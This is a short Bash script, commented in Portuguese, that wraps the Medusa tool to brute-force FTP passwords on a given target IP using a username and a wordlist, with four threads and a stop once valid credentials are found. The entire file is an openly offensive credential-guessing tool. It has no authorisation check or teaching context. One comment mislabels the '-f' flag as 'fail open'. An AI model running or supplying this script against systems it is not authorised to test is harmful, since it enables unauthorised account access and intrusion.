#!/bin/bash
# Uso: ./medusa_ftp.sh <target_ip> <user> <wordlist>
if [ "$#" -ne 3 ]; then
echo "Usage: $0 <target_ip> <user> <wordlist>"
exit 1
fi
TARGET=$1
USER=$2
WORDLIST=$3


# Porta FTP padrão 21
medusa -h $TARGET -u $USER -P $WORDLIST -M ftp -T 4 -f


# -T 4 -> threads
# -f -> para após encontrar credenciais válidas (fail open)
